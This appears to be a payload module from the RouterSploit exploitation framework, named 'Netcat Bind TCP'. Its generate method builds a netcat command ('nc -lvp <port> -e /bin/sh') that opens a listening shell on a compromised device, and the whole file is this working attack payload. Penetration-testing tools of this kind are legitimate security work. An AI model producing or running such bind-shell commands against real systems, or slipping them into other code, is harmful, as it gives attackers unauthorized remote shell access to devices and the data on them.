from routersploit import exploits
from routersploit.payloads import BindTCPPayloadMixin, GenericPayload


class Exploit(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        'name': 'Netcat Bind TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    netcat_binary = exploits.Option('/bin/nc', 'Netcat binary')
    shell_binary = exploits.Option('/bin/sh', 'Shell')

    def generate(self):
        return "{} -lvp {} -e {}".format(self.netcat_binary,
                                         self.rport,
                                         self.shell_binary)
